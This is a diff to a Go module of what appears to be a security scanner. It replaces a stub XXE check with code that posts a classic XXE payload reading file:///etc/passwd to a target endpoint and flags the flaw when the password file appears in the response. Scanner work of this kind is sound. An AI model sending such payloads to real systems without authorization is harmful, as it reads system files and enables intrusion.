@@ -1,22 +1,30 @@
 package modules
 
 import (
+	"bytes"
 	"context"
 	"fmt"
+	"io/ioutil"
+	"net/http"
+	"strings"
 
 	"github.com/autonomouspen/scanner/internal/scanner"
 )
+
+type XXEScanner struct {
+	client *http.Client
+}
+
+func NewXXEScanner() *XXEScanner {
+	return &XXEScanner{
+		client: &http.Client{},
+	}
+}
 
 // XMLEndpoint represents an endpoint that accepts XML.
 type XMLEndpoint struct {
 	URL    string
 	Method string
-}
-
-type XXEScanner struct{}
-
-func NewXXEScanner() *XXEScanner {
-	return &XXEScanner{}
 }
 
 func (s *XXEScanner) Scan(ctx context.Context, target *Target, results chan<- *scanner.Vulnerability) {
@@ -48,13 +56,31 @@ func (s *XXEScanner) testClassicXXE(ctx context.Context, endpoint *XMLEndpoint, 
 	<!DOCTYPE foo [<!ELEMENT foo ANY>
 	<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
 	<foo>&xxe;</foo>`
-	// In a real implementation, we would send this payload and check the response.
-	// For this example, we'll just report a potential vulnerability.
-	results <- &scanner.Vulnerability{
-		Name:     "Classic XXE",
-		Severity: "High",
-		Description:  fmt.Sprintf("Potential XXE vulnerability at %s", endpoint.URL),
-		Evidence: payload,
+
+	req, err := http.NewRequest(endpoint.Method, endpoint.URL, bytes.NewBuffer([]byte(payload)))
+	if err != nil {
+		return
+	}
+	req.Header.Set("Content-Type", "application/xml")
+
+	resp, err := s.client.Do(req)
+	if err != nil {
+		return
+	}
+	defer resp.Body.Close()
+
+	body, err := ioutil.ReadAll(resp.Body)
+	if err != nil {
+		return
+	}
+
+	if strings.Contains(string(body), "root:x:0:0:") {
+		results <- &scanner.Vulnerability{
+			Name:        "Classic XXE",
+			Severity:    "High",
+			Description: fmt.Sprintf("Potential XXE vulnerability at %s", endpoint.URL),
+			Evidence:    payload,
+		}
 	}
 }
 
